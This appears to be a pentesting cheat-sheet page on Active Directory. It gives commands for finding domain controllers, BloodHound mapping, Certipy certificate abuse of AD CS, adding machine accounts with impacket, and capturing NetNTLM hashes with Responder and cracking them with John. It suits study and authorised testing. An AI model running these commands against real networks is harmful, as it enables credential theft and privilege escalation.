---
title: Active Directory (AD) Pentesting
description: Active Directory is a directory service developed by Microsoft for Windows domain networks.
tags:
    - Active Directory
    - Privilege Escalation
draft: false
---

## Investigation

- **Credentials**

    **[OSINT](./OSINT)** may help you to examine the credentials.

- **Find Domain Controllers**

    ```sh
    dig @<target-ip> <domain-name> any
    ```

- **Enumeration**

    **[Seatbelt](https://github.com/GhostPack/Seatbelt)**

<br />

## Basic Knowledge

- **User Management**

    1. **Delegation**

        In Active Directory, the administrator delegate another user to manage users over an Organizational Unit (OU),  without the admin privileges.

        1. Setup

            1. Open "Active Directory Users and Computers".
            2. Right-click on the target OU, and click “Deligate Control…”. Then the new window will open.
            3. In the window, input username who you want to delegate the privilege that manage users.
            4. Select tasks to which the delegated user should manage.
            5. Click OK.

        2. Manage Users

            1. Logon as the delegated user.
            2. For instance, if you want to reset the john's password, execute the following command in PowerShell. Then input new password in prompt.

                ```powershell
                Set-ADAccountPassword john -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
                ```
            
            3. The first time John logs on after that, we want John to change his arbitrary password not the password you entered. So that to, execute the following command.

                ```powershell
                Set-ADUser -ChangePasswordAtLogon $true -Identity john -Verbose
                ```

            4. Now when John logs on he will be prompt to change a new password.


<br />

## Reveal Relationships

- **Use Bloodhound**

    [Bloodhound](https://github.com/BloodHoundAD/BloodHound) is an analyzing tool of Active Directory.

    ```sh
    # Start neo4j before starting Bloodhound
    neo4j console

    # Start Bloodhound
    bloodhound
    ```

<br />

## Active Directory Certificate Services (AD CS)

1. **Request Certification & Authentication**

    **[Certipy](https://github.com/ly4k/Certipy)** is a tool for enumerating and abusing of AD CS.

    ```sh
    # User Template
    certipy req 'vuln.local/username:password@vuln.com' -ca VULN-CA  -template User
    # Machine Template
    certipy req 'vuln.local/machine-name:machine-password@vuln.com' -ca VULN-CA -template Machine

    # After requesting it, use the output credential when authenticating
    certipy auth -pfx user.pfx
    certipy auth -pfx machine.pfx
    ```

2. **Add Your Computer to the Domain**

    Using **addcomputer ([impacket](https://github.com/SecureAuthCorp/impacket))**  
    It is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.

    ```sh
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    # or
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password@<hostname>' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    ```

<br />

## Intercept NetNTLM Authentication

Start Responder to listen for any LLMNR, NBT-NS, WPAD requests.

```sh
sudo responder -I <interface-like-eth0>
```

Leave Responder running until receiving some requests.  
If you get NTLM hash, crack it in local machine.

```sh
echo -n '<copied-NTLM-hash>' > hash.txt
john --format=netntlmv2 --wordlist=wordlist.txt hash.txt
```

